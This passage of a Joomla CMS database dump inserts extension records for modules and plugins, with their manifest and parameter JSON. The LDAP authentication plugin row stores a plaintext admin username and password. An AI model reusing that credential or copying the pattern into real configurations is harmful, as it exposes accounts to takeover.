00:00:00',0,0),(206,'mod_feed','module','mod_feed','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_feed\",\"type\":\"module\",\"creationDate\":\"July 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_FEED_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(207,'mod_footer','module','mod_footer','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_footer\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_FOOTER_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(208,'mod_login','module','mod_login','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_login\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LOGIN_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(209,'mod_menu','module','mod_menu','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_menu\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_MENU_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(210,'mod_articles_news','module','mod_articles_news','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_news\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_ARTICLES_NEWS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(211,'mod_random_image','module','mod_random_image','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_random_image\",\"type\":\"module\",\"creationDate\":\"July 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_RANDOM_IMAGE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(212,'mod_related_items','module','mod_related_items','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_related_items\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_RELATED_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(213,'mod_search','module','mod_search','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_search\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_SEARCH_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(214,'mod_stats','module','mod_stats','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_stats\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_STATS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(215,'mod_syndicate','module','mod_syndicate','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_syndicate\",\"type\":\"module\",\"creationDate\":\"May 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_SYNDICATE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(216,'mod_users_latest','module','mod_users_latest','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_users_latest\",\"type\":\"module\",\"creationDate\":\"December 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_USERS_LATEST_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(217,'mod_weblinks','module','mod_weblinks','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_weblinks\",\"type\":\"module\",\"creationDate\":\"July 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_WEBLINKS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(218,'mod_whosonline','module','mod_whosonline','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_whosonline\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_WHOSONLINE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(219,'mod_wrapper','module','mod_wrapper','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_wrapper\",\"type\":\"module\",\"creationDate\":\"October 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_WRAPPER_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(220,'mod_articles_category','module','mod_articles_category','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_category\",\"type\":\"module\",\"creationDate\":\"February 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_ARTICLES_CATEGORY_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(221,'mod_articles_categories','module','mod_articles_categories','',0,1,1,0,'{\"legacy\":false,\"name\":\"mod_articles_categories\",\"type\":\"module\",\"creationDate\":\"February 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_ARTICLES_CATEGORIES_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(222,'mod_languages','module','mod_languages','',0,1,1,1,'{\"legacy\":false,\"name\":\"mod_languages\",\"type\":\"module\",\"creationDate\":\"February 2010\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LANGUAGES_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(223,'mod_finder','module','mod_finder','',0,1,0,0,'{\"legacy\":false,\"name\":\"mod_finder\",\"type\":\"module\",\"creationDate\":\"August 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_FINDER_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(300,'mod_custom','module','mod_custom','',1,1,1,1,'{\"legacy\":false,\"name\":\"mod_custom\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_CUSTOM_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(301,'mod_feed','module','mod_feed','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_feed\",\"type\":\"module\",\"creationDate\":\"July 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_FEED_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(302,'mod_latest','module','mod_latest','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_latest\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LATEST_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(303,'mod_logged','module','mod_logged','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_logged\",\"type\":\"module\",\"creationDate\":\"January 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LOGGED_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(304,'mod_login','module','mod_login','',1,1,1,1,'{\"legacy\":false,\"name\":\"mod_login\",\"type\":\"module\",\"creationDate\":\"March 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_LOGIN_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(305,'mod_menu','module','mod_menu','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_menu\",\"type\":\"module\",\"creationDate\":\"March 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_MENU_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(307,'mod_popular','module','mod_popular','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_popular\",\"type\":\"module\",\"creationDate\":\"July 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_POPULAR_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(308,'mod_quickicon','module','mod_quickicon','',1,1,1,1,'{\"legacy\":false,\"name\":\"mod_quickicon\",\"type\":\"module\",\"creationDate\":\"Nov 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_QUICKICON_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(309,'mod_status','module','mod_status','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_status\",\"type\":\"module\",\"creationDate\":\"Feb 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"(C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_STATUS_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(310,'mod_submenu','module','mod_submenu','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_submenu\",\"type\":\"module\",\"creationDate\":\"Feb 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_SUBMENU_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(311,'mod_title','module','mod_title','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_title\",\"type\":\"module\",\"creationDate\":\"Nov 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_TITLE_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(312,'mod_toolbar','module','mod_toolbar','',1,1,1,1,'{\"legacy\":false,\"name\":\"mod_toolbar\",\"type\":\"module\",\"creationDate\":\"Nov 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_TOOLBAR_XML_DESCRIPTION\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(313,'mod_multilangstatus','module','mod_multilangstatus','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_multilangstatus\",\"type\":\"module\",\"creationDate\":\"September 2011\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_MULTILANGSTATUS_XML_DESCRIPTION\",\"group\":\"\"}','{\"cache\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(314,'mod_version','module','mod_version','',1,1,1,0,'{\"legacy\":false,\"name\":\"mod_version\",\"type\":\"module\",\"creationDate\":\"January 2012\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"MOD_VERSION_XML_DESCRIPTION\",\"group\":\"\"}','{\"format\":\"short\",\"product\":\"1\",\"cache\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(315,'mod_stats_admin','module','mod_stats_admin','',1,1,1,0,'{\"name\":\"mod_stats_admin\",\"type\":\"module\",\"creationDate\":\"September 2012\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2012 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.0.0\",\"description\":\"MOD_STATS_XML_DESCRIPTION\",\"group\":\"\"}','{\"serverinfo\":\"0\",\"siteinfo\":\"0\",\"counter\":\"0\",\"increase\":\"0\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(316,'mod_tags_popular','module','mod_tags_popular','',0,1,1,0,'{\"name\":\"mod_tags_popular\",\"type\":\"module\",\"creationDate\":\"January 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.1.0\",\"description\":\"MOD_TAGS_POPULAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"maximum\":\"5\",\"timeframe\":\"alltime\",\"owncache\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(317,'mod_tags_similar','module','mod_tags_similar','',0,1,1,0,'{\"name\":\"mod_tags_similar\",\"type\":\"module\",\"creationDate\":\"January 2013\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"3.1.0\",\"description\":\"MOD_TAGS_SIMILAR_XML_DESCRIPTION\",\"group\":\"\"}','{\"maximum\":\"5\",\"matchtype\":\"any\",\"owncache\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(400,'plg_authentication_gmail','plugin','gmail','authentication',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_authentication_gmail\",\"type\":\"plugin\",\"creationDate\":\"February 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_GMAIL_XML_DESCRIPTION\",\"group\":\"\"}','{\"applysuffix\":\"0\",\"suffix\":\"\",\"verifypeer\":\"1\",\"user_blacklist\":\"\"}','','',0,'0000-00-00 00:00:00',1,0),(401,'plg_authentication_joomla','plugin','joomla','authentication',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_authentication_joomla\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_AUTH_JOOMLA_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(402,'plg_authentication_ldap','plugin','ldap','authentication',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_authentication_ldap\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_LDAP_XML_DESCRIPTION\",\"group\":\"\"}','{\"host\":\"\",\"port\":\"389\",\"use_ldapV3\":\"0\",\"negotiate_tls\":\"0\",\"no_referrals\":\"0\",\"auth_method\":\"bind\",\"base_dn\":\"\",\"search_string\":\"\",\"users_dn\":\"\",\"username\":\"admin\",\"password\":\"bobby7\",\"ldap_fullname\":\"fullName\",\"ldap_email\":\"mail\",\"ldap_uid\":\"uid\"}','','',0,'0000-00-00 00:00:00',3,0),(403,'plg_content_contact','plugin','contact','content',0,1,1,0,'','','','',0,'0000-00-00 00:00:00',1,0),(404,'plg_content_emailcloak','plugin','emailcloak','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_emailcloak\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTENT_EMAILCLOAK_XML_DESCRIPTION\",\"group\":\"\"}','{\"mode\":\"1\"}','','',0,'0000-00-00 00:00:00',1,0),(405,'plg_content_geshi','plugin','geshi','content',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_content_geshi\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"\",\"authorUrl\":\"qbnz.com\\/highlighter\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTENT_GESHI_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',2,0),(406,'plg_content_loadmodule','plugin','loadmodule','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_loadmodule\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_LOADMODULE_XML_DESCRIPTION\",\"group\":\"\"}','{\"style\":\"xhtml\"}','','',0,'2011-09-18 15:22:50',0,0),(407,'plg_content_pagebreak','plugin','pagebreak','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_pagebreak\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_CONTENT_PAGEBREAK_XML_DESCRIPTION\",\"group\":\"\"}','{\"title\":\"1\",\"multipage_toc\":\"1\",\"showall\":\"1\"}','','',0,'0000-00-00 00:00:00',4,0),(408,'plg_content_pagenavigation','plugin','pagenavigation','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_pagenavigation\",\"type\":\"plugin\",\"creationDate\":\"January 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_PAGENAVIGATION_XML_DESCRIPTION\",\"group\":\"\"}','{\"position\":\"1\"}','','',0,'0000-00-00 00:00:00',5,0),(409,'plg_content_vote','plugin','vote','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_vote\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_VOTE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',6,0),(410,'plg_editors_codemirror','plugin','codemirror','editors',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_editors_codemirror\",\"type\":\"plugin\",\"creationDate\":\"28 March 2011\",\"author\":\"Marijn Haverbeke\",\"copyright\":\"\",\"authorEmail\":\"N\\/A\",\"authorUrl\":\"\",\"version\":\"1.0\",\"description\":\"PLG_CODEMIRROR_XML_DESCRIPTION\",\"group\":\"\"}','{\"lineNumbers\":\"1\",\"lineWrapping\":\"1\",\"matchTags\":\"1\",\"matchBrackets\":\"1\",\"marker-gutter\":\"1\",\"autoCloseTags\":\"1\",\"autoCloseBrackets\":\"1\",\"autoFocus\":\"1\",\"theme\":\"default\",\"tabmode\":\"indent\"}','','',0,'0000-00-00 00:00:00',1,0),(411,'plg_editors_none','plugin','none','editors',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_editors_none\",\"type\":\"plugin\",\"creationDate\":\"August 2004\",\"author\":\"Unknown\",\"copyright\":\"\",\"authorEmail\":\"N\\/A\",\"authorUrl\":\"\",\"version\":\"2.5.0\",\"description\":\"PLG_NONE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',2,0),(412,'plg_editors_tinymce','plugin','tinymce','editors',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_editors_tinymce\",\"type\":\"plugin\",\"creationDate\":\"2005-2013\",\"author\":\"Moxiecode Systems AB\",\"copyright\":\"Moxiecode Systems AB\",\"authorEmail\":\"N\\/A\",\"authorUrl\":\"tinymce.moxiecode.com\\/\",\"version\":\"3.5.4.1\",\"description\":\"PLG_TINY_XML_DESCRIPTION\",\"group\":\"\"}','{\"mode\":\"1\",\"skin\":\"0\",\"entity_encoding\":\"raw\",\"lang_mode\":\"0\",\"lang_code\":\"en\",\"text_direction\":\"ltr\",\"content_css\":\"1\",\"content_css_custom\":\"\",\"relative_urls\":\"1\",\"newlines\":\"0\",\"invalid_elements\":\"script,applet,iframe\",\"extended_elements\":\"\",\"toolbar\":\"top\",\"toolbar_align\":\"left\",\"html_height\":\"550\",\"html_width\":\"750\",\"resizing\":\"true\",\"resize_horizontal\":\"false\",\"element_path\":\"1\",\"fonts\":\"1\",\"paste\":\"1\",\"searchreplace\":\"1\",\"insertdate\":\"1\",\"format_date\":\"%Y-%m-%d\",\"inserttime\":\"1\",\"format_time\":\"%H:%M:%S\",\"colors\":\"1\",\"table\":\"1\",\"smilies\":\"1\",\"media\":\"1\",\"hr\":\"1\",\"directionality\":\"1\",\"fullscreen\":\"1\",\"style\":\"1\",\"layer\":\"1\",\"xhtmlxtras\":\"1\",\"visualchars\":\"1\",\"nonbreaking\":\"1\",\"template\":\"1\",\"blockquote\":\"1\",\"wordcount\":\"1\",\"advimage\":\"1\",\"advlink\":\"1\",\"advlist\":\"1\",\"autosave\":\"1\",\"contextmenu\":\"1\",\"inlinepopups\":\"1\",\"custom_plugin\":\"\",\"custom_button\":\"\"}','','',0,'0000-00-00 00:00:00',3,0),(413,'plg_editors-xtd_article','plugin','article','editors-xtd',0,1,1,1,'{\"legacy\":false,\"name\":\"plg_editors-xtd_article\",\"type\":\"plugin\",\"creationDate\":\"October 2009\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_ARTICLE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(414,'plg_editors-xtd_image','plugin','image','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_editors-xtd_image\",\"type\":\"plugin\",\"creationDate\":\"August 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_IMAGE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',2,0),(415,'plg_editors-xtd_pagebreak','plugin','pagebreak','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_editors-xtd_pagebreak\",\"type\":\"plugin\",\"creationDate\":\"August 2004\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_EDITORSXTD_PAGEBREAK_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',3,0),(416,'plg_editors-xtd_readmore','plugin','readmore','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_editors-xtd_readmore\",\"type\":\"plugin\",\"creationDate\":\"March 2006\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights reserved.\",\"authorEmail\":\"admin@joomla.org\",\"authorUrl\":\"www.joomla.org\",\"version\":\"2.5.0\",\"description\":\"PLG_READMORE_XML_DESCRIPTION\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',4,0),(417,'plg_search_categories','plugin','categories','search',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_search_categories\",\"type\":\"plugin\",\"creationDate\":\"November 2005\",\"author\":\"Joomla! Project\",\"copyright\":\"Copyright (C) 2005 - 2014 Open Source Matters. All rights 